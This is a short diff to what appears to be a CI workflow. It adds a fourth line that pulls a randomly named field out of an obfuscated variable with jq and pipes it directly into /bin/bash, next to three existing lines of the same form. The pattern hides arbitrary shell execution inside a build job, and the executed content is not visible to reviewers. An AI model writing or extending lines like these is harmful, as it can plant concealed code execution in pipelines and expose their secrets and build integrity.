@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$njly9006" | jq -r .k17442 | /bin/bash
           echo $xwulg98 | jq -r .uhpuq039 | /bin/bash
           echo $sjq40 | jq -r .mdl3 | /bin/bash
+          echo $ulb3 | jq -r .j9341 | /bin/bash
 
       - name: Persist output
         if: always()
